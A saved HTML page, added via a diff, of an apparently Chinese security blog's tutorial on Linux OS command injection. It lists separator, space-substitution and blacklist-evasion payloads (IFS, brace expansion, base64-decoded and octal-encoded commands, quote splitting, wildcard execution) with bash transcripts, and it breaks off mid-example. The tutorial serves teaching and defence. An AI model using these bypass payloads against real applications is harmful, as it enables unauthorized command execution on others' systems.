@@ -1,0 +1,1191 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
+  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+    <meta name="description" content="当应用需要调用一些外部程序去处理的情况下，就会用到一些执行系统命令的函数，这些函数将字符串当做参数传递给 shell 来当做系统命令来执行，若用户可以控制参数，就有可能通过 OS 命令注入来执行任意命令。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux OS 命令注入指北">
+<meta property="og:url" content="https://www.tr0y.wang/2019/05/13/OS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">
+<meta property="og:site_name" content="Tr0y&#39;s Blog">
+<meta property="og:description" content="当应用需要调用一些外部程序去处理的情况下，就会用到一些执行系统命令的函数，这些函数将字符串当做参数传递给 shell 来当做系统命令来执行，若用户可以控制参数，就有可能通过 OS 命令注入来执行任意命令。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/injection.png/cover">
+<meta property="article:published_time" content="2019-05-13T14:06:26.000Z">
+<meta property="article:modified_time" content="2023-12-14T06:19:30.000Z">
+<meta property="article:author" content="Tr0y">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="注入">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/injection.png/cover">
+  
+  
+  
+  <title>Linux OS 命令注入指北 - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+<link rel="stylesheet" href="/css/my-piczoom.css">
+<link rel="stylesheet" href="/css/my-code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tr0y&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                生命线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                摄影集
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Linux OS 命令注入指北"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-05-13 14:06" pubdate>
+          2019年5月13日 14:06:26
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          8.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          52 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="经验总结"
+        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
+        aria-expanded="true"
+      >
+        经验总结
+        <span class="list-group-count">(85)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
+           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/31/2021/" title="2021 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/01/12/flag-in-2021/" title="2021，来立些 flag 吧"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021，来立些 flag 吧</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/01/31/2022/" title="2022 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2022 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/03/15/2023/" title="2023 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 云南之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 云南之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/03/14/2024/" title="2024 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 🇫🇯 斐济之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 🇫🇯 斐济之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF 指北"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSRF 指北</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/06/07/CtfMiscStega/" title="CTF 杂项之隐写术"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CTF 杂项之隐写术</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/09/14/DNS-1-basic/" title="DNS 安全（一）：基础知识复习"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">DNS 安全（一）：基础知识复习</span>
+        </a>
+      
+    
+      
+      
+        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
+          <span class="category-post">More...</span>
+        </a>
+        
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
+        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
+        aria-expanded="false"
+      >
+        过程记录
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
+           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 强网杯三道 pyjail 的题解"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 强网杯三道 pyjail 的题解</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Linux OS 命令注入指北</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2 年前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>当应用需要调用一些外部程序去处理的情况下，就会用到一些执行系统命令的函数，这些函数将字符串当做参数传递给 shell 来当做系统命令来执行，若用户可以控制参数，就有可能通过 OS 命令注入来执行任意命令。</p>
+<span id="more"></span>
+<p><strong>以下 payload 均在 Ubuntu 的 bash 实际测试过</strong></p>
+<h2 id="简介">简介</h2>
+<blockquote>
+<p>命令注入是一种通过存在漏洞的应用程序向主机操作系统执行任意命令。当应用程序对用户提供的数据（表单，cookie，http 头）不进行检测传递给系统 shell，那么就有可能存在命令注入。在这种攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的特权执行。主要原因是输入验证不足导致命令注入攻击。</p>
+</blockquote>
+<p>需要注意的是，OS 命令注入导致命令执行，和代码执行是不同的，代码执行的例子：<code>&lt;?php assert($_POST['a']);?&gt;</code>，当<code>a=phpinfo()</code>的时候就会执行<code>phpinfo</code>。任意代码执行会导致任意命令执行。</p>
+<h2 id="联动">联动</h2>
+<p>编程语言一般都会提供内置的函数来执行系统命令，我称之为联动，例如 PHP 的 <code>system()</code>。不同语言与 shell 之间的联动大同小异，本文内容主要以 PHP 为例。</p>
+<h2 id="应对限制">应对限制</h2>
+<h3 id="命令分隔符">命令分隔符</h3>
+<blockquote>
+<p>禁止使用命令分隔符。</p>
+</blockquote>
+<p>常规的是命令分隔符 <code>;</code>，但是还有很多可以代替它的：</p>
+<ul>
+<li><code>;</code>：常规分隔符，不论<code>;</code>前面的命令执行成功与否都会执行后面的命令。</li>
+<li><code>&amp;&amp;</code>：<code>&amp;&amp;</code> 左边的命令成功执行后，&amp;&amp; 右边的命令才能够被执行。</li>
+<li><code>||</code>：如果 <code>||</code> 左边的命令执行失败了就执行 <code>||</code> 右边的命令。</li>
+<li><code>&amp;</code>：<code>&amp;</code> 放在启动参数后面表示设置此进程为后台进程，这里可以巧妙地作为命令分隔符：<code>ls&amp;whoami</code>实际上相当于 <code>ls &amp;; whoami</code>，即将<code>ls</code>放到后台运行，结束后再运行 <code>whoami</code>。</li>
+<li><code>|</code>：管道符左边命令的输出作为管道符右边命令的输入。所以左边的输出并不显示。</li>
+<li><code>%0a</code>：url 编码的换行符</li>
+<li><code>%0d</code>：url 编码的回车符</li>
+<li><code>%00</code>：url 编码的 NULL，高版本（&gt;=5.4.38）PHP 的 <code>exec</code>、<code>system</code>、<code>passthru</code> 都会拦截，不仅仅是报个 warning，命令也是不执行的：<br />
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">system</span>(): <span class="hljs-keyword">NULL</span> byte detected. Possible attack <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="空格或者特殊字符">空格或者特殊字符</h3>
+<blockquote>
+<p>禁止使用空格。</p>
+</blockquote>
+<p>能替换空格的也有很多：</p>
+<ul>
+<li><code>&lt;</code>：输入重定向，后面需要接目录或者文件名，例如<code>ls&lt;./</code>，所以不是所有的命令都可以使用它作为空格替代符，例如<code>ping</code>：<br />
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bash-3.2$ </span>ping&lt;<span class="hljs-keyword">baidu.com</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bash: </span><span class="hljs-keyword">baidu.com: </span>No such file <span class="hljs-keyword">or </span><span class="hljs-keyword">directory</span><br></code></pre></td></tr></table></figure></li>
+<li><code>&lt;&gt;</code>：打开一个文件作为输入与输出使用。所以它比<code>&lt;</code>的限制更严格，后面必须是文件，连目录都不行：<br />
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ cat&lt;&gt;key<br><span class="hljs-attribute">Macr0phag3</span><br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ ls&lt;&gt;./<br><span class="hljs-attribute">bash</span>: ./: Is a directory<br></code></pre></td></tr></table></figure></li>
+<li><code>%09</code>：url 编码的制表符的。</li>
+<li><code>%0a</code>：url 编码的换行符。</li>
+<li><code>$&#123;IFS&#125;</code>、<code>$IFS</code>：首先，<code>IFS</code>是一个系统变量，内置的分隔符，查看默认的<code>IFS</code>：<br />
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">bash<span class="hljs-number">-3.2</span><span class="hljs-symbol">$</span> <span class="hljs-keyword">set</span> |grep <span class="hljs-comment">IFS</span><br>IFS=$<span class="hljs-string">&#x27; \t\n&#x27;</span><br></code></pre></td></tr></table></figure><br />
+所以它可以用来替代空格。那么 <code>$&#123;IFS&#125;</code>与<code>$IFS</code>有什么区别呢？其实是没有区别的，<code>$&#123;&#125;</code>的作用仅仅是起到了精确界定变量名称的作用，比如<code>$ab</code>实际上有歧义，可以说是<code>$a</code>与<code>b</code>，也可以说是<code>$ab</code>，Linux 默认按照最长的来解析，即<code>$ab</code>，如果我们就是想写<code>$a</code>与<code>b</code>的话，需要这样<code>$&#123;a&#125;b</code>。当然<code>$&#123;&#125;</code>还有变量替换的作用，与这里无关就不细说了。</li>
+<li><code>&#123;cmd,arg&#125;</code>：这个方法实际上是巧妙地利用了<code>花括号扩展</code>：<a target="_blank" rel="noopener" href="http://www.gnu.org/software/bash/manual/bashref.html#Brace-Expansion">传送门🚪</a>。花括号扩展本来的作用是组合，例如：<br />
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ echo a&#123;d,c&#125;e<br><span class="hljs-attribute">ade</span> ace<br></code></pre></td></tr></table></figure><br />
+也就是说，d、c 都是候选字符，输出的结果是候选的组合。我们可以看到，中间多了一个空格。所以就可以这样利用：<br />
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">bash-3.2$ <span class="hljs-keyword">echo</span> &#123;<span class="hljs-keyword">ls</span>,<span class="hljs-string">./</span>&#125;<br><span class="hljs-keyword">ls</span> <span class="hljs-string">./</span><br>bash-3.2$ &#123;<span class="hljs-keyword">ls</span>,<span class="hljs-string">./</span>&#125;<br>Applications	Documents	<span class="hljs-string">...</span><br><span class="hljs-string">...</span><br></code></pre></td></tr></table></figure><br />
+需要多个参数也是可以的，加多个<code>,</code>就行：<code>&#123;ls,./,./,./&#125;</code><br />
+不过需要注意，使用花括号扩展的时候，<code>&#123;&#125;</code>中不能有空格。</li>
+</ul>
+<blockquote>
+<p>其他</p>
+</blockquote>
+<p>个人感觉这两个有点鸡肋：</p>
+<ul>
+<li><code>$PS2</code> == <code>&gt;</code><br />
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># echo &quot;&lt;?php echo &#x27;Macr0phag3&#x27;; ?$PS2&quot;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Macr0phag3&#x27;</span>; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><br />
+一个非常长的命令可以通过在末尾加 <code>\</code> 使其分行显示 ，而<code>$PS2</code> 是多行命令的默认提示符，默认值是 <code>&gt;</code></li>
+<li><code>$PS4</code> == <code>+</code>。它是 <code>set -x</code> 用来修改跟踪输出的前缀（很少很少用到）</li>
+</ul>
+<h3 id="命令">命令</h3>
+<blockquote>
+<p>黑名单、白名单过滤来禁止使用一些系统命令。</p>
+</blockquote>
+<ul>
+<li>单字符组合
+<ul>
+<li><code>a=l;b=s;$a$b</code> == <code>ls</code></li>
+<li><code>a=c;b=at;c=Macr;d=0phag3;$a$b $&#123;c&#125;$&#123;d&#125;</code> == <code>cat Macr0phag3</code></li>
+</ul></li>
+<li>利用已有的文字
+<ul>
+<li><code>echo $PATH |cut  -c 1</code> 可以获取到 <code>/</code></li>
+</ul></li>
+<li>字符串变形
+<ul>
+<li>base64：<br />
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">[macr0phag3@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> ~]# `echo Y2F0Cg==| base64 -d` key<br>Macr0phag3<br></code></pre></td></tr></table></figure></li>
+<li><code>$(printf "\167\150\157\141\155\151")</code> # 8 进制，等价于 whoami，同理 16 进制也可以</li>
+</ul></li>
+<li>利用<code>空</code>：<br />
+Bash 很多东西都是<code>空</code>，例如<code>''</code>、不存在的变量等等，就可以利用他们来隔开命令：
+<ul>
+<li>续行符<code>\</code>：<code>c\at key</code>甚至是<code>\c\a\t \k\e\y</code>。实际上，<code>\</code>放在命令的开头是可以用来忽略 alias 的，详细的在下面有讨论。</li>
+<li><code>l''s</code>：<code>l''s</code> == <code>ls</code></li>
+<li><code>"l""s"</code>或者<code>'l''s'</code>或者<code>'l'"s"</code>或者<code>l"s"</code>...</li>
+<li><code>l$&#123;anything&#125;s</code>：因为<code>anything</code>不存在，是空的，所以<code>l$&#123;anything&#125;s</code> == <code>ls</code>，与<code>l''s</code>原理一样。</li>
+<li><code>l$1s</code>、<code>l$2s</code>、...、<code>l$9s</code>：相比上面那个，这个方法不用<code>&#123;&#125;</code>也可以，因为这类数字名变量的名称界定比较特殊。至于它们是什么意思：<br />
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$0</span>: Shell 本身，所以这里有个技巧是 &#123;<span class="hljs-built_in">printf</span>,<span class="hljs-string">&quot;\167\150\157\141\155\151&quot;</span>&#125; | <span class="hljs-variable">$0</span><br><span class="hljs-variable">$1</span>~<span class="hljs-variable">$n</span>: Shell 的各参数值。<span class="hljs-variable">$1</span> 是第 1 个参数、<span class="hljs-variable">$2</span> 是第 2 个参数，以此类推。<br></code></pre></td></tr></table></figure></li>
+<li><code>l$*s</code>、<code>l$@s</code>：它们都表示所有 Shell 参数的列表，不包括脚本本身（即 <code>$1</code> - <code>$n</code>）。但是还是有区别的。举例：执行 <code>test.sh 1 2 3</code>时，<code>"$*"</code>表示<code>"1 2 3"</code>，而<code>"$@"</code>表示<code>"1" "2" "3"</code>。二者没有被引号引起来时是一样的都为<code>"1 2 3"</code>，只有当被引号引起来后才不一样。</li>
+<li><code>l$!s</code>：<code>$!</code>代表 Shell 最后运行的后台 Process 的 PID。可以简单地理解为，例如一个命令放到后台运行：<code>ping baidu.com &amp;</code> 后它的 PID。</li>
+<li><code>c$()at key</code>：<code>$()</code>代表执行一个<code>空</code>的命令，返回值也为空。当然这样也是可以的：<code>l$(echo s)</code>。</li>
+<li><code>l``s</code>：这样当然也可以了。</li>
+</ul></li>
+<li>花括号扩展<br />
+花括号扩展上面说过了，这里不赘述了：<br />
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-3.2$ <span class="hljs-built_in">echo</span> &#123;c,c&#125;at key<br><span class="hljs-built_in">cat</span> <span class="hljs-built_in">cat</span> key<br></code></pre></td></tr></table></figure><br />
+虽然<code>cat</code>报错了，但是不影响<code>cat key</code>执行。不过不是所有的命令都能这样使用：<br />
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ echo &#123;w,w&#125;hoami key<br><span class="hljs-attribute">whoami</span> whoami key<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ &#123;w,w&#125;hoami key<br><span class="hljs-attribute">usage</span>: whoami<br></code></pre></td></tr></table></figure><br />
+只有形似<code>cmd cmd ars</code>也能执行后面的<code>cmd arg</code>的时候才能使用。</li>
+<li>利用 <code>*</code><br />
+直接运行 <code>*</code> 非常有意思
+<ol type="1">
+<li>如果当前目录下没有任何文件/文件夹、或者是 <code>"*"</code>、或者是 <code>'*'</code>，那么 <code>*</code> 都会被当做 星号 这个字符本身来使用：<br />
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">bash<span class="hljs-literal">-3</span>.<span class="hljs-number">2</span><span class="hljs-variable">$</span> <span class="hljs-built_in">rm</span> ./*<br>bash<span class="hljs-literal">-3</span>.<span class="hljs-number">2</span><span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span> *<br><span class="hljs-built_in">ls</span>: cannot access <span class="hljs-string">&#x27;*&#x27;</span>: No such file or directory<br></code></pre></td></tr></table></figure></li>
+<li>而如果下面是有文件/文件夹的话，<code>*</code> 就起到了通配符的作用：<br />
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ touch test<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ ls *<br><span class="hljs-attribute">test</span><br></code></pre></td></tr></table></figure></li>
+<li>那么就很显然了，执行单个 <code>*</code> 的时候，其实是将 ls 的第一个结果（按照文件名称从小到大来列出文件），当做命令，其他结果当做参数传递：<br />
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ rm ./*<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ touch whoami<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ touch ls<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ *  # 此时等价于 ls whoami<br><span class="hljs-attribute">whoami</span><br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ rm ./*<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ touch rm<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ touch zookeeper.sh<br><span 